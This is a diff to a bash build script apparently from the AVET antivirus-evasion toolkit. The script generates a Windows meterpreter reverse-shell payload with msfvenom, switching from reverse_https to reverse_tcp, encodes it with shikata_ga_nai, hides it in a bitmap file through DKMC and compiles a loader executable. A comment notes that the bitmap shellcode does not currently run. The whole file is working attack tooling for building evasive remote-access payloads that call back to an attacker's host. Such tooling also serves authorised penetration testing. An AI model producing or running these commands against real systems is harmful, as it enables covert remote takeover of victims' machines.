@@ -1,4 +1,8 @@
-#!/bin/bash          
+#!/bin/bash  
+
+# +++ WARNING +++
+# Currently, the BMP shellcode does not execute properly! It seems that DKMC generates invalid shellcode.
+
 # example script for building executables and DKMC payload
 # which is nice, this is hiding the shellcode in a valid bitmap file
 # DKMC has to be in a directory side by side to avet eg. ~/tools/avet ~/tools/DKMC for running this script
@@ -28,10 +32,9 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, format correct for DKMC and run DKMC for making the bitmap file
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows | sed 's/\\/\\\\/g' > output/sc.txt
-x=`./tools/sh_format output/sc.txt | tr -d "\n" | tr -d ";" | tr -d "\""`
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > output/sc.txt
 cd ../DKMC
-printf "gen\nset output /var/www/html/sc.bmp\nset shellcode $x\nrun\nexit\nexit\n" | python dkmc.py
+printf "gen\nset output ../avet/output/sc.bmp\nset shellcode %s\nrun\nexit\nexit\n" `../avet/tools/sh_format/sh_format output/sc.txt | tr -d "\n" | tr -d ";" | tr -d "\""` | python dkmc.py
 cd ../avet
 
 # set shellcode source
@@ -44,8 +47,8 @@ set_key_source none
 # set shellcode binding technique
 set_shellcode_binding exec_shellcode
 
-# enable debug output
-enable_debug_print
+# don't enable debug output because printing the whole bmp payload takes a lot of time
+#enable_debug_print
 
 # compile 
 $win32_compiler -s -o output/output.exe source/avet.c -lwsock32 -lWs2_32
